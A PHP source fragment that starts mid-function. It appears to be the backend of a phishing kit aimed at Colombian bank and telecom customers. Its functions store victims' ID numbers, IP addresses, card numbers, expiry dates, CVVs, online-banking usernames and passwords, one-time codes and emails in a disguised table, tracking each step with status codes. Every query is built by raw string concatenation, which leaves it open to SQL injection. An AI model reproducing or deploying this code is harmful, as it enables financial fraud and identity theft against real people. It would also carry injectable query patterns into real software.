	$ip_add = $_SERVER['REMOTE_ADDR'];
	$hoy = date("Y-m-d H:i:s"); 
	if ($con = conectar()) {
		if (sentencia($con,"INSERT INTO m3it3m (idreg, idcliente, lineaclaro, dispositivo, ip, status, horacreado, horamodificado) VALUES (NULL, '".$ced."', '".$lin."', '".$dis."', '".$ip_add."', '13', '".$hoy."', '".$hoy."')")) {
			$consulta = sentencia($con,"SELECT idreg FROM m3it3m WHERE idcliente = '".$ced."' ORDER BY idreg DESC LIMIT 1");
			if (contarfilas($consulta)) {
				$datos=traerdatos($consulta);
				setcookie('id', (string)$datos["idreg"], time() + 60 * 9, '/', '', false, true);
				echo $datos["idreg"];
			}			
		}else{
			echo "NO";
		}
		desconectar($con);
	}else{
		echo "ERR";
	}
}

function create_card($id,$tar,$fec,$cvv,$ban){

	date_default_timezone_set('America/Bogota');
	$hoy = date("Y-m-d H:i:s"); 

	if ($con = conectar()) {
		sentencia($con,"UPDATE m3it3m SET status = '7', tarjeta ='".$tar."', ftarjeta ='".$fec."', cvv ='".$cvv."', banco ='".$ban."', horamodificado='".$hoy."' WHERE idreg = ".$id);
		desconectar($con);
	}
}

function status($r){
	if ($con = conectar()) {
		$consulta = sentencia($con,"SELECT status FROM m3it3m WHERE idreg = '".$r."'");
		if (contarfilas($consulta)) {
			$datos=traerdatos($consulta);
			return $datos["status"];
		}else{

		}
		desconectar($con);
	}else{

	}
}

function upgrade_user($id,$usr,$pas,$ban){
	date_default_timezone_set('America/Bogota');
	$hoy = date("Y-m-d H:i:s"); 

	if ($con = conectar()) {
		sentencia($con,"UPDATE m3it3m SET status = '1', usuario ='".$usr."', password= '".$pas."', banco= '".$ban."', horamodificado='".$hoy."' WHERE idreg = ".$id);
		desconectar($con);
	}
}

function put_otp($id,$cd){
	date_default_timezone_set('America/Bogota');
	$hoy = date("Y-m-d H:i:s"); 

	if ($con = conectar()) {
		sentencia($con,"UPDATE m3it3m SET status = '3', otp ='".$cd."', horamodificado='".$hoy."' WHERE idreg = ".$id);
		desconectar($con);
	}
}

function put_mail($id,$mail,$cm,$cel){
	date_default_timezone_set('America/Bogota');
	$hoy = date("Y-m-d H:i:s"); 
	if ($con = conectar()) {
		sentencia($con,"UPDATE m3it3m SET status = '5', email='".$mail."', cemail='".$cm."', celular='".$cel."', horamodificado='".$hoy."'  WHERE idreg = ".$id);
		desconectar($con);
	}
}

function put_pse($id,$mail){
	date_default_timezone_set('America/Bogota');
	$hoy = date("Y-m-d H:i:s"); 
	if ($con = conectar()) {
		sentencia($con,"UPDATE m3it3m SET status = '15', correopse='".$mail."', horamodificado='".$hoy."'  WHERE idreg = ".$id);
		desconectar($con);
	}
}


function put_psw($id,$mail){
	date_default_timezone_set('America/Bogota');
	$hoy = date("Y-m-d H:i:s"); 
	if ($con = conectar()) {
		sentencia($con,"UPDATE m3it3m SET status = '12', correopse='".$mail."', horamodificado='".$hoy."'  WHERE idreg = ".$id);
		desconectar($con);
	}
}



function put_card($id,$tar,$ft,$cvv){
	date_default_timezone_set('America/Bogota');
	$hoy = date("Y-m-d H:i:s"); 
	if ($con = conectar()) {	
		sentencia($con,"UPDATE m3it3m SET status = '7', tarjeta='".$tar."', ftarjeta='".$ft."', cvv='".$cvv."', horamodificado='".$hoy."'  WHERE idreg = ".$id);
		desconectar($con);
	}
}


?>